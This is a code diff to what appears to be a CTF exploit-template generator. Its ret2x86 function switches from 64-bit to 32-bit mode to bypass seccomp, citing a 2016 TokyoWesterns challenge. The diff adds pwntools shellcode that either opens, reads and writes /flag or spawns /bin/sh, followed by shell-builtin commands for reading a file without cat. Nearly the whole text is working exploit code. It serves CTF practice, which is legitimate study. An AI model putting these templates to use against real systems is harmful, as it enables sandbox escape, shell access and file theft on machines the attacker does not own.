@@ -10,8 +10,9 @@ def ret2x86():
     switch from 64-bit to 32-bit to bypass seccomp
     challenge: TW 2016 MMA diary
     wp: https://uaf.io/exploitation/2016/09/06/TokyoWesterns-MMA-Diary.html
-    note that after switch to 32bit you should use open, read and write
-    syscall to print the flag instead of execve("/bin/sh")
+    note that after switch to 32bit you can't execute cat, so you can use orw to
+    get the flag if you know the flag filename, or get a shell and then use
+     shell's build-in's commands
     """
     template = ("""MPROTECT_START = # bss is recommended
 MPROTECT_LEN = 
@@ -29,11 +30,23 @@ retf''', arch='amd64')
 
     template += ("""context.bits = 32 # if context.bits=64, then use shellcraft to generate 32-bit
 # shellcode will fail
-BUF_ADDR = # buf to store flag
-FLAG_LEN = 0x40
-p2 = asm(shellcraft.i386.open("/flag", 0x80000, 0), arch='x86') # fopen("/flag", "r")
-p2 += asm(shellcraft.i386.read('eax', BUF_ADDR, FLAG_LEN), arch='x86')
-p2 += asm(shellcraft.i386.write(1, BUF_ADDR, FLAG_LEN), arch='x86')
+
+if ORW:
+    BUF_ADDR = # buf to store flag
+    FLAG_LEN = 0x40
+    p2 = asm(shellcraft.i386.open("/flag", 0x80000, 0), arch='x86') # fopen("/flag", "r")
+    p2 += asm(shellcraft.i386.read('eax', BUF_ADDR, FLAG_LEN), arch='x86')
+    p2 += asm(shellcraft.i386.write(1, BUF_ADDR, FLAG_LEN), arch='x86')
+else:
+    p2 = asm(shellcraft.i386.linux.sh(), os='linux', arch='x86')
+    io.interactive()
+    # then execute following commands
+    '''
+    note that we could'nt use cat, so we should use shell's build-in commands.
+    echo * # equal to ls
+    read -r line < flag_filename 
+    echo $line # get the  flag !
+    '''
 """)
 
     return template
